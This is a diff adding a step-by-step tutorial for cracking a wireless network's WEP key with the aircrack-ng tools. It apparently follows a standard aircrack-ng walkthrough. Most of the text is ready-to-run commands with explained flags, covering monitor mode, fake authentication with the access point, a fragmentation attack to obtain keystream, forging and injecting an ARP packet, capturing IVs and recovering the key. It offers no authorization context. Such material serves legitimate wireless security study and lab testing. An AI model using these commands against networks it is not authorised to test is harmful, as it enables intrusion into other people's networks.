@@ -1,0 +1,100 @@
+Step 1 - Set the wireless card MAC address
+
+To be honest, we will not be changing the wireless card MAC address.
+
+------------------------------------------------------------------------
+
+Step 2 - Start the wireless interface in monitor mode on AP channel
+
+Enter the following command to start the wireless card on channel 9 in monitor mode:
+
+airmon-ng start wifi0 9
+
+-----------------------------------------------------------------------
+
+Step 3 - Use aireplay-ng to do a fake authentication with the access point
+
+aireplay-ng -1 0 -e teddy -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 ath0
+Where:
+
+-1 means fake authentication
+0 reassociation timing in seconds
+-e teddy is the wireless network name
+-a 00:14:6C:7E:40:80 is the access point MAC address
+-h 00:09:5B:EC:EE:F2 is our card MAC address
+ath0 is the wireless interface name
+-----------------------------------------------------------------------
+
+Step 4 - Use aireplay-ng chopchop or fragmenation attack to obtain PRGA
+
+aireplay-ng -5 -b 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 ath0
+Where:
+
+-5 means the fragmentation attack
+-b 00:14:6C:7E:40:80 is the access point MAC address
+-h 00:09:5B:EC:EE:F2 is the MAC address of our card and must match the MAC used in the fake
+authentication
+ath0 is the wireless interface name
+
+-----------------------------------------------------------------------
+
+Step 5 - Use packetforge-ng to create an arp packet
+
+In the previous step, we obtained PRGA. It does not matter which attack generated the PRGA,
+both are equal. This PRGA is stored in the files ending with “xor”. We can then use this
+PRGA to generate a packet for injection. We will be generating an arp packet for injection.
+The objective is to have the access point rebroadcast the injected arp packet. When it
+rebroadcasts it, a new IV is obtained. All these new IVs will ultimately be used to crack
+the WEP key.
+
+But first, lets generate the arp packet for injection by entering:
+
+ packetforge-ng -0 -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 -k 255.255.255.255 -l
+ 255.255.255.255 -y fragment-0203-180343.xor -w arp-request
+ Where:
+
+ -0 means generate an arp packet
+ -a 00:14:6C:7E:40:80 is the access point MAC address
+ -h 00:09:5B:EC:EE:F2 is MAC address of our card
+ -k 255.255.255.255 is the destination IP (most APs respond to 255.255.255.255)
+ -l 255.255.255.255 is the source IP (most APs respond to 255.255.255.255)
+ -y fragment-0203-180343.xor is file to read the PRGA from (NOTE: Change the file name to
+ the actual file name out in step 4 above)
+ -w arp-request is name of file to write the arp packet to
+
+-----------------------------------------------------------------------
+
+Step 6 - Start airodump-ng
+
+ Open another console session to capture the generated IVs. Then enter:
+
+ airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w capture ath0
+ Where:
+
+ -c 9 is the channel for the wireless network
+ --bssid 00:14:6C:7E:40:80 is the access point MAC address. This eliminate extraneous
+ traffic.
+ -w capture is file name prefix for the file which will contain the captured packets.
+ ath0 is the interface name.
+
+-----------------------------------------------------------------------
+
+Step 7 - Inject the arp packet
+
+ Using the console session where you generated the arp packet, enter:
+
+  aireplay-ng -2 -r arp-request ath0
+  Where:
+
+  -2 means use interactive frame selection
+  -r arp-request defines the file name from which to read the arp packet
+  ath0 defines the interface to use
+
+-----------------------------------------------------------------------
+
+Step 8 - Run aircrack-ng to obtain the WEP key
+
+Start another console session and enter:
+
+aircrack-ng -b 00:14:6C:7E:40:80 capture*.cap 
+
